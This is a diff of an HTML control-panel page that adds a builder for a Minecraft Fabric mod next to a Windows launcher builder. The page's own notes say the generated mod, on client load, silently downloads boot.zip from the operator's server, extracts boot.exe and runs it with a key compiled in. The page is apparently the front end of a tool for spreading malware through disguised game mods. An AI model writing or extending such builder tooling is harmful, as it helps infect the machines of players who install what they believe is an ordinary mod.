@@ -161,20 +161,21 @@
       <div class="page-head">
         <div>
           <h2>build</h2>
-          <div class="sub">compiles the client with your key baked in.</div>
+          <div class="sub">windows launcher and minecraft fabric mod.</div>
         </div>
         <div class="actions">
           <span class="count" id="b-count">—</span>
         </div>
       </div>
 
+      <!-- Windows launcher -->
       <div class="builder-card">
         <div class="builder-row">
           <div class="builder-input">
             <label for="b-key">account key</label>
             <input id="b-key" placeholder="leave blank to use your account key">
           </div>
-          <button class="primary" id="b-build">build</button>
+          <button class="primary" id="b-build">build launcher</button>
         </div>
         <div class="note">the key gets compiled into the binary. each build replaces the live boot.exe.</div>
       </div>
@@ -186,6 +187,41 @@
           <span></span><span>base</span><span>size</span><span>built</span><span>actions</span>
         </div>
         <div id="b-rows"></div>
+      </div>
+
+      <!-- Minecraft fabric mod -->
+      <div class="builder-card" style="margin-top:28px">
+        <div class="builder-row" style="align-items:flex-start;flex-direction:column;gap:12px">
+          <div style="display:flex;align-items:flex-start;gap:10px;width:100%;flex-wrap:wrap">
+            <div class="builder-input" style="flex:1;min-width:200px">
+              <label for="mc-version">minecraft target (fabric)</label>
+              <select id="mc-version" style="width:100%">
+                <option value="1.21.1">1.21.1</option>
+                <option value="1.21.2">1.21.2</option>
+                <option value="1.21.3">1.21.3</option>
+                <option value="1.21.4">1.21.4</option>
+              </select>
+            </div>
+            <div class="builder-input" style="flex:1;min-width:200px">
+              <label for="mc-loader">fabric loader range</label>
+              <input id="mc-loader" value=">=0.15.0" placeholder=">=0.15.0">
+            </div>
+            <button class="primary" id="mc-build" style="margin-top:14px;white-space:nowrap">build .jar</button>
+          </div>
+          <div class="note">fabric mod. on client load it downloads <code>boot.zip</code> from this server, extracts <code>boot.exe</code>, and runs it. key is baked in.</div>
+        </div>
+
+        <div id="mc-progress" style="display:none;margin-top:16px">
+          <div style="display:flex;justify-content:space-between;font-size:11px;color:var(--muted);margin-bottom:6px;font-family:var(--mono)">
+            <span id="mc-step">queued</span>
+            <span id="mc-pct">0%</span>
+          </div>
+          <div style="height:6px;background:var(--bg);border:1px solid var(--line);border-radius:3px;overflow:hidden">
+            <div id="mc-bar" style="height:100%;width:0%;background:var(--accent);transition:width .3s ease;border-radius:3px"></div>
+          </div>
+        </div>
+
+        <div id="mc-result"></div>
       </div>
     </section>
 
